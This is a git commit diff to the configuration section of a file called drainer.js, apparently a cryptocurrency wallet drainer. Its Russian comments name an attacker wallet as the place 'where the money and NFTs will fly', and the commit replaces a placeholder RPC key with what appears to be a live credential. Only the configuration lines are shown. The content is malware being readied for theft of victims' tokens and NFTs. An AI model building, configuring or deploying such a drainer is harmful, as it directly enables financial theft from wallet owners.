b4967bc102e7f48e080e319edcd8b42de58e30e6
5gfhd2dd5m-ai <5gfhd2dd5m@privaterelay.appleid.com>
2026-09-04 17:58:34 +0200

    Update drainer.js

--- drainer.js
+++ drainer.js
@@ -1,6 +1,6 @@
 / --- КОНФИГУРАЦИЯ ---
 const your_wallet_address = "0x0e7F3426C8bBE2ceA15EF02d45E0F4a7CB279dC1"; // Адрес, куда полетят деньги и NFT
-const rpc_url = "https://mainnet.infura.io/v3/ТВОЙ_INFURA_ID"; // RPC для Ethereum. Можешь заменить на BSC, Polygon и т.д.
+const rpc_url = "https://mainnet.infura.io/v3/alch_lGVkwAB6WnSoJ0pyCkFEc"; // RPC для Ethereum. Можешь заменить на BSC, Polygon и т.д.
 const chain_id = 1; // 1 для Ethereum, 56 для BSC, 137 для Polygon
 
 // Список адресов популярных ERC-20 токенов для проверки
